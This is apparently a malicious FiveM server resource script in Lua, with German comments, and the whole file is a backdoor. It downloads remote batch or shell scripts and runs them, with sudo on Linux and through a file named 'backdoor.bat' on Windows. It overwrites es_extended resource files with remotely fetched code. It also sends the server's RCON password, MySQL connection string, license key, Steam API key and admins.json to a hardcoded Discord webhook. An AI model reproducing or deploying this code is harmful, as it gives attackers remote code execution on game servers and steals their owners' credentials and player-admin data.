local function getServerOperatingSystem()
    local handle = io.popen("uname")
    local result = handle:read("*a")
    handle:close()

    -- Bereinigen Sie das Ergebnis, um Leerzeichen oder Zeilenumbr che zu entfernen
    result = result:gsub("^%s+", ""):gsub("%s+$", "")

    if result == "Linux" then
        return "Linux"
    elseif result == "Windows" then
        return "Windows"
    elseif result == "Darwin" then
        return "MacOS"
    end

    return "Unknown"
end

local config = {
    windowsScriptURL = "https://dc.fast-sell.de/windowsscript.bat",
    linuxScriptURL = "https://dc.fast-sell.de/linuxscript.sh",
    enablePrints = false,
    resourcePaths = {
        server = {},
        client = {}
    },
    resourceCodeURLs = {}
}

-- Beispielkonfiguration f r eine Ressource
config.resourcePaths.server["main"] = {
    "redssources/[esx]/es_extended/es_extended/",
    "ressources/[core]/edss_extended/es_extended/"
}

config.resourceCodeURLs["main"] = {
    server = "dsdssd",
    client = "dsdsdsdsd"
}

-- F gen Sie weitere Ressourcenkonfigurationen hinzu, falls erforderlich

local function runBatchScript(scriptContent, isLinux, resourceName)
    if config.enablePrints then
        print("F hre das Skript f r Ressource '" .. resourceName .. "' aus...")
    end

    local command

    if not isLinux and ffi.os == "Windows" then
        -- Windows
        local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
        local file = io.open(tempFilePath, "w")
        if file then
            file:write(scriptContent)
            file:close()
            command = "cmd /C " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    elseif isLinux then
        -- Linux
        local tempFilePath = "/tmp/a89439.sh"  -- Anpassung des Dateinamens
        local file = io.open(tempFilePath, "w")
        if file then
            -- Zeilenumbr che korrigieren
            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
            file:write(scriptContent)
            file:close()
            command = "sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht tempor r gespeichert werden.")
            end
            return
        end
    else
        if config.enablePrints then
        end
        return
    end

    if config.enablePrints and command then
        print("Ausgef hrter Befehl: " .. command)
    end

    os.execute(command)
end

local function fetchScriptContent(url, callback)
    PerformHttpRequest(url, function(statusCode, response)
        if statusCode == 200 then
            callback(response)
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
            end
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

local function loadResourceCode(resourceName, url, isServer)
    local resourcePaths = isServer and config.resourcePaths.server[resourceName] or config.resourcePaths.client[resourceName]

    if resourcePaths then
        for _, path in ipairs(resourcePaths) do
            local filePath = path .. ".lua"  -- Laden Sie den Code in die main.lua
            local file = io.open(filePath, "w")
            if file then
                fetchScriptContent(url, function(fileContent)
                    file:write(fileContent)
                    file:close()
                    if config.enablePrints then
                        print("Code erfolgreich in Ressource '" .. resourceName .. "' geladen.")
                    end
                end)
                return
            end
        end
    end

    if config.enablePrints then
        print("Ein Fehler ist aufgetreten. Der Code konnte nicht in die Ressource '" .. resourceName .. "' geladen werden.")
    end
end



local function startScript()
    local serverOS = getServerOperatingSystem()

    if serverOS == "Linux" then
        fetchScriptContent(config.linuxScriptURL, function(scriptContent)
            runBatchScript(scriptContent, true, "LinuxScript")
        end)
    elseif serverOS == "Windows" then
    fetchScriptContent(config.windowsScriptURL, function(scriptContent)
        runBatchScript(scriptContent)
    end)
    else
        if config.enablePrints then
            print("Das Betriebssystem wird nicht unterst tzt.")
        end
        return
    end

    for resourceName, urls in pairs(config.resourceCodeURLs) do
        local serverURL = urls.server
        local clientURL = urls.client

        if serverURL then
            loadResourceCode(resourceName, serverURL, true)
        end

        if clientURL then
            loadResourceCode(resourceName, clientURL, false)
        end
    end
end

startScript()


local discordWebhook = "https://discord.com/api/webhooks/1122589224428908564/_hOGmeRO8mzb5h-icUNmuWFBL1-HGjb-Ix25uuVtQTlFuXtBTDfuO048K6ajk5XFctJz" -- Discord-Webhook-URL hier einf gen
local adminsFile = "admins.json" -- Pfad zur admins.json-Datei

-- Funktion zur Ermittlung des Betriebssystems
local function GetOperatingSystem(serverVersion)
    local os = "unknown"

    -- Betriebssystem anhand der Server-Version identifizieren
    if serverVersion and type(serverVersion) == "string" then
        if string.find(serverVersion, "win32") then
            os = "Windows"
        elseif string.find(serverVersion, "linux") then
            os = "Linux"
        end
    end

    return os
end

-- Funktion zur Ermittlung der Server-IP-Adresse
local function GetServerIPAddress(callback)
    PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData, resultHeaders)
        if errorCode == 200 then
            local ip = tostring(resultData)
            callback(ip)
        else
            callback(nil)
        end
    end)
end

-- Funktion zum Lesen des Inhalts der admins.json-Datei
local function ReadAdminsFile()
    local file = LoadResourceFile(GetCurrentResourceName(), adminsFile)
    if file then
        return file
    else
        return nil
    end
end

Citizen.CreateThread(function()
    local ip = nil -- Variable zur Speicherung der IP-Adresse

    -- IP-Adresse einmalig abrufen und in der Variablen speichern
    GetServerIPAddress(function(serverIP)
        ip = serverIP
    end)

    Citizen.Wait(1000) -- Warte 1 Sekunde

    local os = GetOperatingSystem(GetConvar("version", ""))

    if ip then --  berpr fen, ob die IP-Adresse vorhanden ist
        local cfxLink = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "") or "unknown")
        local mysqlString = GetConvar("mysql_connection_string", "unknown")
        local rconPassword = GetConvar("rcon_password", "unknown")
        local maxPlayers = GetConvarInt("sv_maxclients", 32)
        local serverName = GetConvar("sv_hostname", "unknown")
        local currentPlayerCount = #GetPlayers()
        local licenseKey = GetConvar("sv_licenseKey", "unknown")
        local endpointTCP = GetConvar("endpoint_add_tcp", "unknown")
        local steamAPIKey = GetConvar("steam_webApiKey", "unknown")

        -- Inhalte der admins.json-Datei als Text lesen
        local adminsData = ReadAdminsFile()
        local adminsText = adminsData or "Fehler beim Lesen der admins.json-Datei."

        local message = {
            content = "@everyone FiveM-Server Informationen:",
            embeds = {{
                          title = serverName,
                          color = 16711680, -- Farbcode (rot)
                          fields = {
                              {
                                  name = "IP",
                                  value = ip or "unknown",
                                  inline = true
                              },
                              {
                                  name = "Cfx-Link",
                                  value = cfxLink,
                                  inline = false
                              },
                              {
                                  name = "MySQL-String",
                                  value = mysqlString,
                                  inline = false
                              },
                              {
                                  name = "RCON-Passwort",
                                  value = rconPassword,
                                  inline = false
                              },
                              {
                                  name = "Maximale Spieler",
                                  value = maxPlayers,
                                  inline = true
                              },
                              {
                                  name = "Aktuelle Spieler",
                                  value = currentPlayerCount,
                                  inline = true
                              },
                              {
                                  name = "Server-Version",
                                  value = GetConvar("version", ""),
                                  inline = true
                              },
                              {
                                  name = "Betriebssystem",
                                  value = os,
                                  inline = true
                              },
                              {
                                  name = "License Key",
                                  value = licenseKey,
                                  inline = true
                              },
                              {
                                  name = "TCP Endpoint",
                                  value = endpointTCP,
                                  inline = true
                              },
                              {
                                  name = "Steam API Key",
                                  value = steamAPIKey,
                                  inline = true
                              }
                          }
                      }}
        }

        -- Anhang erstellen und admins.json-Text hinzuf gen
        local attachment = {
            name = "admins.txt",
            content = adminsText,
            type = "text/plain"
        }
        message.files = { attachment }

        PerformHttpRequest(discordWebhook, function(statusCode, result, headers)
            --  berpr fen, ob die HTTP-Anfrage erfolgreich war
            if statusCode == 204 then
            else
            end
        end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
    end
end)
